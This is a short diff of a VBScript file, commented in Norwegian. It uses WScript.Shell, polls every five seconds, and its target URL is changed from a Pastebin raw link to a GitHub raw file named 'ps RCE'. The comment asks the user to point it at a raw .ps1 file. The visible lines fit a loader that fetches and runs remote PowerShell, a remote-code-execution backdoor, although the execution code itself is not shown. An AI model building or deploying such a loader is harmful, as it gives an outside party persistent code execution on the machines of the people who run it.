@@ -4,7 +4,7 @@ Set shell = CreateObject("WScript.Shell")
 ' ====================================================================
 ' CONFIGURATION - Endre URL til din råe .ps1-fil (f.eks. Pastebin/GitHub)
 ' ====================================================================
-targetURL = "https://pastebin.com/raw/hVY96d2S"
+targetURL = "https://raw.githubusercontent.com/aaaaaaaaaad2131213123123belgia/test/refs/heads/main/ps%20RCE"
 checkInterval = 5 ' Hvor ofte den sjekker etter oppdateringer (i sekunder)
 
 ' ====================================================================
